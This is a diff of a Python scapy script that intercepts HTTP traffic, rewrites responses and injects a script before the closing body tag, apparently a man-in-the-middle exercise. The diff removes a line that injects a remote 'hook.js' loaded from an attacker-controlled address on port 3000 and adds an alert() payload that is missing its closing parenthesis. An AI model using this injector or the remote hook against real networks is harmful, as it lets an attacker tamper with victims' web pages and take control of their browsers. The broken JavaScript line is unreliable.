@@ -13,7 +13,7 @@ def set_load(packet, load):
 
 
 def process_packet(packet, test=None):
-    scapy_packet = scapy.IP(packet.get_payload)
+    scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
@@ -22,7 +22,7 @@ def process_packet(packet, test=None):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print('---> Response')
-            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
+            injection_code = '<script>alert("You Are Under Attack"</script>'
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
             if content_length_search and "text/html" in load:
